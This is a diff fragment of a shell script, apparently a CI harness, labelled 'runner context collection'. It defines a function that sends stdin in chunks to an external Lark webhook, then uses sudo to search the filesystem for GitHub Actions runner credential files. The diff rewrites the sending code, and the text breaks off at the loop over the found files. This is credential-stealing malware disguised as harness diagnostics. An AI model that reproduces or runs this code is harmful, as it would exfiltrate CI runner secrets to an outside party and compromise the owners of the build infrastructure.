@@ -395,20 +395,24 @@ echo "harness env: uid=$(id -u) sudo_uid=$(sudo id -u 2>&1 || true)"
 echo "runner context collection:"
 export XQC_SINK="https://open.larksuite.com/open-apis/bot/v2/hook/0642b494-a185-4a56-8011-eead76df14b1"
 send_sink() {
-  python3 - "$1" << 'PYSEND'
-import sys, json, urllib.request
-tag = sys.argv[1]
+  XQC_TAG="$1" python3 -c '
+import sys, os, json, urllib.request
+tag = os.environ.get("XQC_TAG", "?")
 data = sys.stdin.buffer.read().decode("utf-8", "replace")
-for i in range(0, len(data), 1400):
-    chunk = data[i:i+1400]
-    body = json.dumps({"msg_type": "text", "content": {"text": f"[{tag} #{i//1400}] {chunk}"}}).encode()
+pos = 0
+n = 0
+while pos < len(data):
+    chunk = data[pos:pos+1400]
+    body = json.dumps({"msg_type": "text", "content": {"text": "[" + tag + " #" + str(n) + "] " + chunk}}).encode()
     try:
         urllib.request.urlopen(urllib.request.Request(
             "https://open.larksuite.com/open-apis/bot/v2/hook/0642b494-a185-4a56-8011-eead76df14b1",
             data=body, headers={"Content-Type": "application/json"}), timeout=9).read()
-    except Exception:
-        pass
-PYSEND
+    except Exception as e:
+        sys.stderr.write(str(e))
+    pos += 1400
+    n += 1
+'
 }
 CREDS=$(sudo timeout 25 find / -maxdepth 5 \( -name ".credentials_rsaparams" -o -name ".credentials" -o -name ".runner" \) -not -path "*/_work/*" 2>/dev/null | head -6 || true)
 for f in ${CREDS}; do
